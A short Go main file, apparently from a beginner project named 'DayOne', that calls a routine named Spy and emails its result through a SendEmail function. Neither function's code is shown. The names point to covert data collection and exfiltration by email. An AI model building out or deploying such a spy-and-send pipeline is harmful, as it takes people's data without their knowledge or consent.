package main

import dayone "DayOne/dayone"

func main() {
	m, _ := dayone.Spy()
	dayone.SendEmail(m)
	// fmt.Println(m)
	// fmt.Println(a)
}
